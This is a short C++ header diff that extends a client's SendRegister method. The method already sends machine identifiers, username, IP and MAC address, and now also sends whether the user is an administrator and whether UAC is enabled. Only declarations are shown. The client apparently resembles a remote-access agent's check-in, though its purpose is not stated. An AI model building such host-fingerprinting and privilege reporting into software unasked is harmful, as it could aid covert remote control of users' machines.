@@ -49,7 +49,8 @@ public:
     bool SendRegister(const char* clientType, const char* hardwareId,
         const char* machineName, const char* osVersion, const char* osArch,
         int cpuCount, long long totalMemory, const char* username,
-        const char* clientVersion, const char* ipAddress, const char* macAddress);
+        const char* clientVersion, const char* ipAddress, const char* macAddress,
+        bool isAdmin, bool isUacEnabled);
 
     // Simplified registration with JSON system info
     bool SendRegister(const char* clientType, const char* hardwareId, const char* systemInfoJson);
